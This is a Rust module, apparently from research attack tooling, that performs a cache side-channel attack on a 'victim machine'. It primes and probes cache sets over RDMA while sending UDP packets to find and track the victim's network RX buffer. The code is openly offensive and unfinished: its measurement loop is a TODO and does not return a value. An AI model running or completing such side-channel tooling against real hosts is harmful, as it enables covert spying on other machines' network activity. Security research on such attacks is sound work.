//! # Online Tracking
//! This module is responsible for tracking and gathering measurements on the state
//! of the RX buffer of the victim machine.

mod tracking;

use crate::connection::rdma;
use crate::rpp::{self, ColorCode, ColoredSetCode, SetCode};
use std::collections::HashMap;
use std::io::Result;
use std::io::{Error, ErrorKind};
use std::net::{ToSocketAddrs, UdpSocket};
use tracking::{SyncStatus, TrackingContext, WINDOW_SIZE};

const REPEATINGS: usize = 8;
const MEASUREMENT_CNT: usize = 10000;

pub type Pattern = Vec<SetCode>;

pub struct OnlineTracker {
    rpp: rpp::Rpp,
    sock: UdpSocket,
    pattern: Pattern,
}

impl OnlineTracker {
    /// Creates a new online tracker. `addr` is the victim-server address.
    /// Fails if port 9009 is used on the attacker machine or if the given
    /// address is unapropriet for connecting to.  
    pub fn new<A: ToSocketAddrs + Clone>(addr: A) -> Result<OnlineTracker> {
        let conn = Box::new(rdma::RdmaServerConnector::new(addr.clone()));
        let rpp = rpp::Rpp::new(conn);
        let sock = UdpSocket::bind("127.0.0.1:9009")?;
        sock.connect(addr)?;
        sock.set_nonblocking(true)?;

        Ok(OnlineTracker {
            rpp,
            sock,
            pattern: Default::default(),
        })
    }

    // TODO: document and fill
    pub fn track(&mut self) -> Result<()> {
        self.locate_rx()?;
        Ok(())
    }

    /// Locates the RX buffer in the cache. The buffer is expected to reside
    /// on a single page and be a single for the os (sometimes there might be
    /// multiple RX buffers)
    /// # Fails
    /// Fails if Prime or Probe fails, if there are issues with sending UDP
    /// packets to the target, and if the pattern cannot be found in the set
    /// of data.
    fn locate_rx(&mut self) -> Result<()> {
        let mut patterns = HashMap::with_capacity(self.rpp.colors_len());
        let color_codes = self.rpp.colors().collect::<Vec<ColorCode>>();

        for color_code in color_codes.into_iter() {
            let color_len = self.rpp.color_len(color_code);
            let mut pattern = Vec::with_capacity(color_len);
            let set_codes = self
                .rpp
                .iter_color(color_code)
                .collect::<Vec<ColoredSetCode>>();

            for _ in 0..REPEATINGS {
                for &colored_set_code in set_codes.iter() {
                    let set_code = SetCode(color_code, colored_set_code);
                    self.rpp.prime(&set_code)?;
                    self.send_packet()?;
                    self.send_packet()?;
                    pattern.push(self.rpp.probe(&set_code)?.map(|x| x.1));
                }
            }

            patterns.insert(color_code, pattern);
        }

        self.pattern = Self::find_pattern(patterns)?;

        Ok(())
    }

    #[inline(always)]
    fn send_packet(&self) -> Result<()> {
        self.sock.send(&[0])?;
        Ok(())
    }

    fn find_pattern(patterns: HashMap<ColorCode, Vec<Option<ColoredSetCode>>>) -> Result<Pattern> {
        let mut fnd_pts = HashMap::with_capacity(1);

        for (color_code, pattern) in patterns {
            let record = Self::pattern_to_rec(pattern);

            let pat = match Self::pat_from_rec(record) {
                Some(pat) => pat,
                None => continue,
            };

            fnd_pts.insert(color_code, pat);
        }

        // For now, we expect only one pattern to arise. If not, then other methods should be used
        // NOTE one may add confidence level for each pattern, based on the statistics for each entry in
        // a pattern
        if fnd_pts.len() != 1 {
            return Err(Error::new(
                ErrorKind::Other,
                "ERROR: Cannot decide on pattern",
            ));
        }

        let (color_code, pat) = fnd_pts.into_iter().next().unwrap();
        let set_code_pat = pat
            .into_iter()
            .map(|colored_set_code| SetCode(color_code, colored_set_code))
            .collect();

        Ok(set_code_pat)
    }

    /// Given a repeated pattern, count which elements repeat on each position
    fn pattern_to_rec(pattern: Vec<Option<ColoredSetCode>>) -> Vec<HashMap<ColoredSetCode, usize>> {
        let chunk_len = pattern.len() / REPEATINGS;
        let mut record = vec![HashMap::new(); chunk_len];

        for (i, v) in pattern.iter().enumerate() {
            if let Some(colored_set_code) = v {
                let cnt = record[i % chunk_len].entry(*colored_set_code).or_insert(0);
                *cnt += 1;
            }
        }

        record
    }

    fn pat_from_rec(rec: Vec<HashMap<ColoredSetCode, usize>>) -> Option<Vec<ColoredSetCode>> {
        rec.into_iter().map(Self::get_max_repeating).collect()
    }

    /// Return None if cannot determine most repeating element.
    fn get_max_repeating(hm: HashMap<ColoredSetCode, usize>) -> Option<ColoredSetCode> {
        if hm.is_empty() {
            return None;
        }

        let (colored_set_code, cnt) = hm.iter().max_by_key(|(_, &cnt)| cnt)?;

        // Check uniqueness of the maximum. If not, then we cannot determine that it is a real max
        if hm
            .iter()
            .any(|(cc, cnt1)| cnt == cnt1 && cc != colored_set_code)
        {
            return None;
        }

        Some(*colored_set_code)
    }

    fn measure(&mut self) -> Result<()> {
        let init_pos = self.get_init_pos()?;
        let mut ctx = TrackingContext::new(init_pos);     

        for _ in 0..MEASUREMENT_CNT {
            let es = self.window(&ctx);
            self.rpp.prime_all(&es)?;

            // TODO: measure
        } 
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pattern_finding() {
        let measurements = vec![
            Some(1),
            Some(9),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            None,
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(8),
            Some(2),
            Some(4),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            None,
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            None,
        ];

        let expected = vec![SetCode(0, 1), SetCode(0, 2), SetCode(0, 3), SetCode(0, 4)];

        let mut hm = HashMap::new();
        hm.insert(0, measurements);

        let pattern = OnlineTracker::find_pattern(hm).expect("No pattern found");
        assert_eq!(expected, pattern, "The pattern is incorrect");
    }
}
